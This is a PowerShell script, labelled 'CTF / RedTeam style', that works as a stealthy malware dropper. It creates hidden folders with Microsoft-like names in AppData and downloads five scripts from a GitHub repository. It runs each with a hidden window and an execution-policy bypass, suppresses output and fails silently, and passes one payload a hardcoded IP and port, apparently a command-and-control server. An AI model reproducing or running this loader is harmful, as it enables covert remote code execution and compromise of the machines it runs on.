# === Parallel Downloader + Executor (THM / CTF / RedTeam Style) ===
$BasePath = "C:\Users\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell"
$OperationPath = "$BasePath\operation"
$SystemPath = "$OperationPath\System"

# Versteckte Ordner anlegen (falls nicht vorhanden)
@($OperationPath, $SystemPath) | ForEach-Object {
    if (-not (Test-Path $_)) {
        New-Item -Path $_ -ItemType Directory -Force | Out-Null
        (Get-Item $_ -Force).Attributes = 'Hidden,Directory'
    }
}

$Scripts = @(
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; Name = "MicrosoftViewS.ps1" }
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; Name = "Sytem.ps1" }
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1"; Name = "WindowsCeasar.ps1" }
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"; Name = "WindowsOperator.ps1" }
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; Name = "WindowsTransmitter.ps1" }
)

# Runspace-Pool für echte Parallelität
$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
$RunspacePool.Open()
$Jobs = @()

foreach ($s in $Scripts) {
    $FilePath = Join-Path $SystemPath $s.Name
    
    $PowerShell = [PowerShell]::Create().AddScript({
        param($Url, $Path, $ScriptName)

        try {
            # Download
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $wc.DownloadFile($Url, $Path)

            # === SPEZIELLER AUFRUF NUR FÜR MicrosoftViewS.ps1 ===
            if ($ScriptName -eq "MicrosoftViewS.ps1") {
                powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path" -a14 "145.223.117.77" -a15 8080 -a16 20 -a17 70 >$null 2>&1
            }
            else {
                # Alle anderen Skripte normal ausführen (wie bisher)
                powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path" >$null 2>&1
            }
        }
        catch {
            # Silent fail
        }
    }).AddArgument($s.Url).AddArgument($FilePath).AddArgument($s.Name)

    $PowerShell.RunspacePool = $RunspacePool
    $Jobs += [PSCustomObject]@{ Instance = $PowerShell; Status = $PowerShell.BeginInvoke() }
}

# Warten bis alle fertig sind (oder Timeout nach 30 Sekunden)
$endTime = (Get-Date).AddSeconds(30)
while (($Jobs.Status.IsCompleted -contains $false) -and (Get-Date) -lt $endTime) {
    Start-Sleep -Milliseconds 500
}
